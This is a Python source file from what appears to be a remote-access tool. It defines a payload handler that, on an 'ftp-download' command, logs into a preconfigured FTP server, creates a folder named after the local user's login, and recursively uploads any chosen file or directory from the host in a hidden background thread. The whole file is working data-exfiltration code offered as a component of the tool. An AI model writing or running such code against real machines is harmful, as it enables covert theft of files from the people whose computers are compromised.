import ftplib
import os
import uuid
from subprocess import call
from payloads.absract_payload_handler import AbstractPayloadHandler
from client import settings
from utils import logger
from threading import Thread

class FTPDownloadPayloadHandler(AbstractPayloadHandler):

    @classmethod
    def get_platform(cls):
        return "cross_platform"

    def ftp_upload(self,path):
        try:
            if os.path.isfile(path):
                with open(path,"rb") as infile:
                    self.myFTP.storbinary('STOR %s' % path, infile)
                return
            files = os.listdir(path)
            os.chdir(path)
            for f in files:
                print(f)
                if os.path.isfile(f):
                    with open(f,"rb") as infile:
                        self.myFTP.storbinary('STOR %s' % f, infile)
                elif os.path.isdir(f):
                    self.myFTP.mkd(f)
                    self.myFTP.cwd(f)
                    self.ftp_upload(f)
            self.myFTP.cwd('..')
            os.chdir('..')
        except Exception as e:
            logger.exception(e)

    def execute_payload(self, data:bytes) -> str:
        '''
        server_addr,username,password,file=data[1],data[2],data[3],data[4]
        '''
        try:
            data=data.decode("utf-8")
            if len(data.split())!=2:
                return "Invalid format: ftp-download file/dir\n"
            file_name=data.split()[1]
            if not os.path.exists(file_name):
                return "Error absoulute path: {} does not exist\n".format(file_name)
            self.myFTP = ftplib.FTP()
            self.myFTP.connect(settings.FTP_SERVER_ADDR,settings.FTP_SERVER_PORT)
            self.myFTP.login(settings.FTP_USER,settings.FTP_PASSWORD)
            x="{}_{}".format(os.getlogin(),str(uuid.uuid4()))
            self.myFTP.mkd(x)
            self.myFTP.cwd(x)
            if os.path.isdir(file_name):
                self.myFTP.mkd(file_name)
                self.myFTP.cwd(file_name)
            
            # when the thread is still uploading the workin dir on the shell also changes :( and am not fixing it
            t = Thread(target=self.ftp_upload, args=(file_name,))
            t.daemon = True
            t.start()
            return "Successfully started download process: {} to ftp server\n".format(file_name)
        except Exception as e:
            logger.exception(e)
            return "Command execution unsuccessful: {}\n".format(str(e))


